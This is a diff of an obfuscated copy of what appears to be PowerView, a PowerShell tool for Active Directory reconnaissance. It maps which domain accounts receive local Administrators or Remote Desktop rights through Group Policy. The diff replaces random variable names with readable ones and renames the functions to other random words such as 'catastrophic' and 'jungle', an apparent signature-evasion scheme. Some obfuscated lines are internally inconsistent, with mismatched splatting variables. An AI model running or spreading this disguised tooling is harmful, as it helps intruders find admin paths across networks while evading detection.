-                                $RcFXGpYz99 += $cgTuSBdj99
+                                $GroupMembers += $Member
                             }
                         }
                     }
-                    $_.GroupMembers = $RcFXGpYz99
+                    $_.GroupMembers = $GroupMembers
                 }
-                $_ | Add-Member Noteproperty 'GPODisplayName' $swqoxVyH99
-                $_ | Add-Member Noteproperty 'GPOName' $cgXwtZoc99
+                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
+                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                 $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                 $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                 $_
@@ -6649,7 +6649,7 @@ function factoring {
         }
     }
 }
-function designation {
+function preciseness {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GPOUserLocalGroupMapping')]
     [CmdletBinding()]
@@ -6657,161 +6657,161 @@ function designation {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [String]
         [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
-        $KqYbWZot99 = 'Administrators',
+        $LocalGroup = 'Administrators',
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $vGdTAAdQ99 = @{}
-        if ($PSBoundParameters['Domain']) { $vGdTAAdQ99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $vGdTAAdQ99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $vGdTAAdQ99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $vGdTAAdQ99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $vGdTAAdQ99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $vGdTAAdQ99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $vGdTAAdQ99['Credential'] = $gxazvivN99 }
+        $CommonArguments = @{}
+        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
     }
     PROCESS {
-        $eazkeAOH99 = @()
+        $TargetSIDs = @()
         if ($PSBoundParameters['Identity']) {
-            $eazkeAOH99 += farrowing @CommonArguments -Identity $BfpbWwpi99 | Select-Object -Expand objectsid
-            $vekcVKXH99 = $eazkeAOH99
-            if (-not $eazkeAOH99) {
-                Throw "[designation] Unable to retrieve SID for identity '$BfpbWwpi99'"
+            $TargetSIDs += dermatitis @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
+            $TargetObjectSID = $TargetSIDs
+            if (-not $TargetSIDs) {
+                Throw "[preciseness] Unable to retrieve SID for identity '$Identity'"
             }
         }
         else {
-            $eazkeAOH99 = @('*')
+            $TargetSIDs = @('*')
         }
-        if ($KqYbWZot99 -match 'S-1-5') {
-            $vwTHvrOJ99 = $KqYbWZot99
+        if ($LocalGroup -match 'S-1-5') {
+            $TargetLocalSID = $LocalGroup
         }
-        elseif ($KqYbWZot99 -match 'Admin') {
-            $vwTHvrOJ99 = 'S-1-5-32-544'
+        elseif ($LocalGroup -match 'Admin') {
+            $TargetLocalSID = 'S-1-5-32-544'
         }
         else {
-            $vwTHvrOJ99 = 'S-1-5-32-555'
+            $TargetLocalSID = 'S-1-5-32-555'
         }
-        if ($eazkeAOH99[0] -ne '*') {
-            ForEach ($pZtebdhW99 in $eazkeAOH99) {
-                Write-Verbose "[designation] Enumerating nested group memberships for: '$pZtebdhW99'"
-                $eazkeAOH99 += burlap @CommonArguments -Properties 'objectsid' -MemberIdentity $pZtebdhW99 | Select-Object -ExpandProperty objectsid
+        if ($TargetSIDs[0] -ne '*') {
+            ForEach ($TargetSid in $TargetSids) {
+                Write-Verbose "[preciseness] Enumerating nested group memberships for: '$TargetSid'"
+                $TargetSIDs += typing @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
             }
         }
-        Write-Verbose "[designation] Target localgroup SID: $vwTHvrOJ99"
-        Write-Verbose "[designation] Effective target domain SIDs: $eazkeAOH99"
-        $WuaiWkno99 = factoring @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
-            $FRFDIlam99 = $_
-            if ($FRFDIlam99.GroupSID -match $vwTHvrOJ99) {
-                $FRFDIlam99.GroupMembers | Where-Object {$_} | ForEach-Object {
-                    if ( ($eazkeAOH99[0] -eq '*') -or ($eazkeAOH99 -Contains $_) ) {
-                        $FRFDIlam99
+        Write-Verbose "[preciseness] Target localgroup SID: $TargetLocalSID"
+        Write-Verbose "[preciseness] Effective target domain SIDs: $TargetSIDs"
+        $GPOgroups = infantry @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
+            $GPOgroup = $_
+            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
+                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
+                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
+                        $GPOgroup
                     }
                 }
             }
-            if ( ($FRFDIlam99.GroupMemberOf -contains $vwTHvrOJ99) ) {
-                if ( ($eazkeAOH99[0] -eq '*') -or ($eazkeAOH99 -Contains $FRFDIlam99.GroupSID) ) {
-                    $FRFDIlam99
+            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
+                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
+                    $GPOgroup
                 }
             }
         } | Sort-Object -Property GPOName -Unique
-        $WuaiWkno99 | Where-Object {$_} | ForEach-Object {
-            $cgXwtZoc99 = $_.GPODisplayName
-            $TWUVwajs99 = $_.GPOName
-            $ZBoaNOpR99 = $_.GPOPath
-            $cAdOiDjf99 = $_.GPOType
+        $GPOgroups | Where-Object {$_} | ForEach-Object {
+            $GPOname = $_.GPODisplayName
+            $GPOguid = $_.GPOName
+            $GPOPath = $_.GPOPath
+            $GPOType = $_.GPOType
             if ($_.GroupMembers) {
-                $xRbqrVMy99 = $_.GroupMembers
+                $GPOMembers = $_.GroupMembers
             }
             else {
-                $xRbqrVMy99 = $_.GroupSID
+                $GPOMembers = $_.GroupSID
             }
-            $kqlIQisk99 = $_.Filters
-            if ($eazkeAOH99[0] -eq '*') {
-                $vwSTTfSi99 = $xRbqrVMy99
+            $Filters = $_.Filters
+            if ($TargetSIDs[0] -eq '*') {
+                $TargetObjectSIDs = $GPOMembers
             }
             else {
-                $vwSTTfSi99 = $vekcVKXH99
+                $TargetObjectSIDs = $TargetObjectSID
             }
-            ivies @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $TWUVwajs99 | ForEach-Object {
-                if ($kqlIQisk99) {
-                    $OCMjMDrx99 = doubtlessly @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($kqlIQisk99.Value)} | Select-Object -ExpandProperty dnshostname
+            vaporizes @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
+                if ($Filters) {
+                    $OUComputers = sonorous @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                 }
                 else {
-                    $OCMjMDrx99 = doubtlessly @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
+                    $OUComputers = sonorous @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                 }
-                if ($OCMjMDrx99) {
-                    if ($OCMjMDrx99 -isnot [System.Array]) {$OCMjMDrx99 = @($OCMjMDrx99)}
-                    ForEach ($pZtebdhW99 in $vwSTTfSi99) {
-                        $Object = farrowing @CommonArguments -Identity $pZtebdhW99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
-                        $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
-                        $oYwckWdc99 = New-Object PSObject
-                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
-                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
-                        $oYwckWdc99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
-                        $oYwckWdc99 | Add-Member Noteproperty 'Domain' $SSNUOPgW99
-                        $oYwckWdc99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
-                        $oYwckWdc99 | Add-Member Noteproperty 'GPODisplayName' $cgXwtZoc99
-                        $oYwckWdc99 | Add-Member Noteproperty 'GPOGuid' $TWUVwajs99
-                        $oYwckWdc99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
-                        $oYwckWdc99 | Add-Member Noteproperty 'GPOType' $cAdOiDjf99
-                        $oYwckWdc99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
-                        $oYwckWdc99 | Add-Member Noteproperty 'ComputerName' $OCMjMDrx99
-                        $oYwckWdc99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
-                        $oYwckWdc99
+                if ($OUComputers) {
+                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}
+                    ForEach ($TargetSid in $TargetObjectSIDs) {
+                        $Object = dermatitis @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
+                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
+                        $GPOLocalGroupMapping = New-Object PSObject
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
+                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
+                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
+                        $GPOLocalGroupMapping
                     }
                 }
             }
-            shoddiness @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $TWUVwajs99 | ForEach-Object {
-                ForEach ($pZtebdhW99 in $vwSTTfSi99) {
-                    $Object = farrowing @CommonArguments -Identity $pZtebdhW99 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
-                    $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
-                    $oYwckWdc99 = New-Object PSObject
-                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
-                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
-                    $oYwckWdc99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
-                    $oYwckWdc99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
-                    $oYwckWdc99 | Add-Member Noteproperty 'Domain' $SSNUOPgW99
-                    $oYwckWdc99 | Add-Member Noteproperty 'GPODisplayName' $cgXwtZoc99
-                    $oYwckWdc99 | Add-Member Noteproperty 'GPOGuid' $TWUVwajs99
-                    $oYwckWdc99 | Add-Member Noteproperty 'GPOPath' $ZBoaNOpR99
-                    $oYwckWdc99 | Add-Member Noteproperty 'GPOType' $cAdOiDjf99
-                    $oYwckWdc99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
-                    $oYwckWdc99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
-                    $oYwckWdc99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
-                    $oYwckWdc99
+            our @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
+                ForEach ($TargetSid in $TargetObjectSIDs) {
+                    $Object = dermatitis @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
+                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
+                    $GPOLocalGroupMapping = New-Object PSObject
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
+                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
+                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
+                    $GPOLocalGroupMapping
                 }
             }
         }
     }
 }
-function mohair {
+function catastrophic {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GGPOComputerLocalGroupMember')]
     [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
@@ -6819,105 +6819,105 @@ function mohair {
         [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
         [String]
-        $HdCnajIa99,
+        $ComputerIdentity,
         [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
         [Alias('OU')]
         [String]
-        $CbxTpJvM99,
+        $OUIdentity,
         [String]
         [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
-        $KqYbWZot99 = 'Administrators',
+        $LocalGroup = 'Administrators',
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $vGdTAAdQ99 = @{}
-        if ($PSBoundParameters['Domain']) { $vGdTAAdQ99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $vGdTAAdQ99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $vGdTAAdQ99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $vGdTAAdQ99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $vGdTAAdQ99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $vGdTAAdQ99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $vGdTAAdQ99['Credential'] = $gxazvivN99 }
+        $CommonArguments = @{}
+        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
     }
     PROCESS {
         if ($PSBoundParameters['ComputerIdentity']) {
-            $bECDGFKr99 = doubtlessly @CommonArguments -Identity $HdCnajIa99 -Properties 'distinguishedname,dnshostname'
-            if (-not $bECDGFKr99) {
-                throw "[mohair] Computer $HdCnajIa99 not found. Try a fully qualified host name."
+            $Computers = sonorous @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'
+            if (-not $Computers) {
+                throw "[catastrophic] Computer $ComputerIdentity not found. Try a fully qualified host name."
             }
-            ForEach ($cXOPCAwl99 in $bECDGFKr99) {
-                $kPEeiRAC99 = @()
-                $DN = $cXOPCAwl99.distinguishedname
-                $sIFBMDeb99 = $DN.IndexOf('OU=')
-                if ($sIFBMDeb99 -gt 0) {
-                    $SARTvoSC99 = $DN.SubString($sIFBMDeb99)
+            ForEach ($Computer in $Computers) {
+                $GPOGuids = @()
+                $DN = $Computer.distinguishedname
+                $OUIndex = $DN.IndexOf('OU=')
+                if ($OUIndex -gt 0) {
+                    $OUName = $DN.SubString($OUIndex)
                 }
-                if ($SARTvoSC99) {
-                    $kPEeiRAC99 += ivies @CommonArguments -SearchBase $SARTvoSC99 -LDAPFilter '(gplink=*)' | ForEach-Object {
+                if ($OUName) {
+                    $GPOGuids += vaporizes @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                         Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
-                Write-Verbose "Enumerating the sitename for: $($cXOPCAwl99.dnshostname)"
-                $UFJqwyIQ99 = (tussled -ComputerName $cXOPCAwl99.dnshostname).SiteName
-                if ($UFJqwyIQ99 -and ($UFJqwyIQ99 -notmatch 'Error')) {
-                    $kPEeiRAC99 += shoddiness @CommonArguments -Identity $UFJqwyIQ99 -LDAPFilter '(gplink=*)' | ForEach-Object {
+                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
+                $ComputerSite = (scrappy -ComputerName $Computer.dnshostname).SiteName
+                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
+                    $GPOGuids += our @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                         Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
-                $kPEeiRAC99 | factoring @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
-                    $FRFDIlam99 = $_
-                    if($FRFDIlam99.GroupMembers) {
-                        $xRbqrVMy99 = $FRFDIlam99.GroupMembers
+                $GPOGuids | infantry @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
+                    $GPOGroup = $_
+                    if($GPOGroup.GroupMembers) {
+                        $GPOMembers = $GPOGroup.GroupMembers
                     }
                     else {
-                        $xRbqrVMy99 = $FRFDIlam99.GroupSID
+                        $GPOMembers = $GPOGroup.GroupSID
                     }
-                    $xRbqrVMy99 | ForEach-Object {
-                        $Object = farrowing @CommonArguments -Identity $_
-                        $sYCvPfIx99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
-                        $wUzbRbYR99 = New-Object PSObject
-                        $wUzbRbYR99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99.dnshostname
-                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
-                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
-                        $wUzbRbYR99 | Add-Member Noteproperty 'ObjectSID' $_
-                        $wUzbRbYR99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
-                        $wUzbRbYR99 | Add-Member Noteproperty 'GPODisplayName' $FRFDIlam99.GPODisplayName
-                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOGuid' $FRFDIlam99.GPOName
-                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOPath' $FRFDIlam99.GPOPath
-                        $wUzbRbYR99 | Add-Member Noteproperty 'GPOType' $FRFDIlam99.GPOType
-                        $wUzbRbYR99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
-                        $wUzbRbYR99
+                    $GPOMembers | ForEach-Object {
+                        $Object = dermatitis @CommonArguments -Identity $_
+                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
+                        $GPOComputerLocalGroupMember = New-Object PSObject
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
+                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
+                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
+                        $GPOComputerLocalGroupMember
                     }
                 }
             }
         }
     }
 }
-function monograms {
+function undergarment {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
     [CmdletBinding()]
@@ -6925,56 +6925,56 @@ function monograms {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Source', 'Name')]
         [String]
-        $SFBkuPBO99 = 'Domain',
+        $Policy = 'Domain',
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $gshqUOUz99 = @{}
-        if ($PSBoundParameters['Server']) { $gshqUOUz99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $ConvertArguments = @{}
+        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
     }
     PROCESS {
         if ($PSBoundParameters['Domain']) {
-            $PPosolen99['Domain'] = $SSNUOPgW99
-            $gshqUOUz99['Domain'] = $SSNUOPgW99
+            $SearcherArguments['Domain'] = $Domain
+            $ConvertArguments['Domain'] = $Domain
         }
-        if ($SFBkuPBO99 -eq 'All') {
-            $PPosolen99['Identity'] = '*'
+        if ($Policy -eq 'All') {
+            $SearcherArguments['Identity'] = '*'
         }
-        elseif ($SFBkuPBO99 -eq 'Domain') {
-            $PPosolen99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
+        elseif ($Policy -eq 'Domain') {
+            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
         }
-        elseif (($SFBkuPBO99 -eq 'DomainController') -or ($SFBkuPBO99 -eq 'DC')) {
-            $PPosolen99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
+        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
+            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
         }
         else {
-            $PPosolen99['Identity'] = $SFBkuPBO99
+            $SearcherArguments['Identity'] = $Policy
         }
-        $KVGbINsU99 = roomfuls @SearcherArguments
-        ForEach ($GPO in $KVGbINsU99) {
-            $CnoFYxhs99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
-            $cqtcZjht99 =  @{
-                'GptTmplPath' = $CnoFYxhs99
+        $GPOResults = meshed @SearcherArguments
+        ForEach ($GPO in $GPOResults) {
+            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
+            $ParseArgs =  @{
+                'GptTmplPath' = $GptTmplPath
                 'OutputObject' = $True
             }
-            if ($PSBoundParameters['Credential']) { $cqtcZjht99['Credential'] = $gxazvivN99 }
-            Tuscon @ParseArgs | ForEach-Object {
+            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
+            remounts @ParseArgs | ForEach-Object {
                 $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                 $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                 $_
@@ -6982,7 +6982,7 @@ function monograms {
         }
     }
 }
-function Wheaties {
+function jungle {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroup.API')]
     [OutputType('PowerView.LocalGroup.WinNT')]
@@ -6992,59 +6992,59 @@ function Wheaties {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = $Env:COMPUTERNAME,
+        $ComputerName = $Env:COMPUTERNAME,
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $AlrHOHqQ99 = 'API',
+        $Method = 'API',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
